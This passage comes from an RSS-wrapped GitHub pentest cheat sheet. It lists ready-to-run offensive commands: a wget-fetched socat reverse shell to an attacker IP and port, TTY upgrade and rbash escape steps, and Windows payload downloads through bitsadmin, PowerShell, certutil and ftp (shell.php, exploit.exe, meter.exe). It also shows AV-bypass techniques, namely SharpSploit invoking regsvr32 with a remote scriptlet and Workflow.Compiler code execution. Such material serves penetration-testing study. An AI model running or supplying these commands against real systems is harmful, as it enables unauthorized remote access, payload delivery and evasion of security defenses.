+&lt;p&gt;&lt;code&gt;wget -q http://10.10.14.16/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.16:4444&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Socat Binary: &lt;a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat"&gt;https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Method 2 &lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;In reverse shell&lt;/p&gt;
+&lt;pre&gt;python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl-Z
+&lt;/pre&gt;
+&lt;p&gt;In kali&lt;/p&gt;
+&lt;pre&gt;echo $TERM
+stty -a
+stty raw -echo
+fg
+&lt;/pre&gt;
+&lt;p&gt;In reverse shell&lt;/p&gt;
+&lt;pre&gt;reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows  columns 
+bash
+&lt;/pre&gt;
+&lt;p&gt;&lt;a name="user-content-jailescape"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-rbash-jail-escape" class="anchor" aria-hidden="true" href="#rbash-jail-escape"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;rbash Jail Escape&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;RequestTTY no&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;ssh -o RequestTTY=no user@ip&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/45673768-dec15480-bb2b-11e8-9d50-513c925b359b.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/45673768-dec15480-bb2b-11e8-9d50-513c925b359b.png" alt="ttyno" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;and the result would be:&lt;/p&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/45673773-e254db80-bb2b-11e8-911a-f0dec70936f4.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/45673773-e254db80-bb2b-11e8-911a-f0dec70936f4.png" alt="ttyfalse2" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;Bash --noprofile&lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;ssh monitor@127.0.0.1 -t "bash --noprofile" &lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/45673871-1defa580-bb2c-11e8-8004-c924ad0ddb56.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/45673871-1defa580-bb2c-11e8-8004-c924ad0ddb56.png" alt="bashnoprofile" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-windowstransfer"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--windows-file-transfer-" class="anchor" aria-hidden="true" href="#-windows-file-transfer-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Windows File Transfer &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;bitsadmin&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bitsadmin /transfer debjob /download /priority normal http://&amp;lt;ip&amp;gt;/shell.php c:\xampp\htdocs\shell.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;cscript wget.vbs (code on the repo)&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;cscript wget.vbs http://&amp;lt;ip&amp;gt;/test.txt test.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;powershell&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;powershell -c "(new-object System.Net.WebClient).Downloadfile('http://&amp;lt;ip&amp;gt;/exploit.exe', 'C:\Windows\temp\exploit.txt')"&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;ftp&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;client:&lt;/p&gt;
+&lt;pre&gt;echo open [ip] [port] &amp;gt; ftpscript.txt
+echo anonymous&amp;gt;&amp;gt; ftpscript.txt
+echo PASS &amp;gt;&amp;gt; ftpscript.txt
+echo bin &amp;gt;&amp;gt; ftpscript.txt
+echo get meter.exe&amp;gt;&amp;gt; ftpscript.txt
+echo quit &amp;gt;&amp;gt; ftpscript.txt
+ftp -s:ftpscript.txt
+&lt;/pre&gt;
+&lt;p&gt;server:&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;python -m pyftpdlib  --port=2121 --write&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt;wget.exe&lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;Upload to vulnerable server from kali: &lt;code&gt; /usr/share/windows-binaries/wget.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;wget.exe http://&amp;lt;ip&amp;gt;/file file&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; certutil &lt;/b&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;certutil -urlcache -split -f  https://&amp;lt;ip&amp;gt;/file.txt file.txt&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-vpnrestrict"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content--bypass-vpn-routing-restrictions-" class="anchor" aria-hidden="true" href="#-bypass-vpn-routing-restrictions-"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Bypass VPN routing restrictions &lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;pre&gt;openconnect vpnXXX02.XXXX.com -u XX -s ‘vpn-slice XXX.46.0.0/16 hostname3 mantis=XXX.41.2XX.68’&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/41146909-30e484de-6b05-11e8-82fb-acfc17a722a2.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/41146909-30e484de-6b05-11e8-82fb-acfc17a722a2.png" alt="vpn1" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Reference: &lt;a href="https://github.com/dlenski/vpn-slice"&gt;https://github.com/dlenski/vpn-slice&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a name="user-content-avbypass"&gt;&lt;/a&gt;&lt;/p&gt;&lt;h3&gt;&lt;a id="user-content-av-bypass" class="anchor" aria-hidden="true" href="#av-bypass"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;AV Bypass&lt;/h3&gt;&lt;p&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; SharpSploit &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt;Start-Process "powershell" "unblock-file .\SharpSploit.dll"
+
+Add-Type -Path .\SharpSploit.dll
+
+[SharpSploit.Execution.Shell]::ShellExecute("regsvr32 /s /n /u /i:http://192.168.48.151:9999/QuHBoZ.sct scrobj.dll")
+&lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/46204073-2c07a800-c31c-11e8-9905-76c168432018.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/46204073-2c07a800-c31c-11e8-9905-76c168432018.png" alt="sharpsploit" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References: &lt;a href="https://cobbr.io/SharpSploit.html" rel="nofollow"&gt;https://cobbr.io/SharpSploit.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;b&gt; Workflow.Compiler &lt;/b&gt;&lt;/p&gt;
+&lt;pre&gt; C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe test.xml results.xml &lt;/pre&gt;
+&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="https://user-images.githubusercontent.com/7115563/46660701-e79bc800-cbb7-11e8-8e07-49615b17d258.png"&gt;&lt;img src="https://user-images.githubusercontent.com/7115563/46660701-e79bc800-cbb7-11e8-8e07-49615b17d258.png" alt="workflow" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;References:&lt;/p&gt;
+&lt;p&gt;&lt;a href="https://www.codeproject.com/Articles/25983/How-to-Execute-a-Command-in-C" rel="nofollow"&gt;https://www.codeproject.com/Articles/25983/How-to-Execute-a-Command-in-C&lt;/a&gt;
+&lt;a href="https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb" rel="nofollow"&gt;https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb&lt;/a&gt;&lt;/p&gt;
+&lt;/article&gt;&lt;/div&gt;</description><author>adon90</author><guid isPermaLink="false">https://github.com/adon90/pentest_compilation</guid><pubDate>Tue, 28 Jan 2020 00:01:00 GMT</pubDate></item></channel></rss>
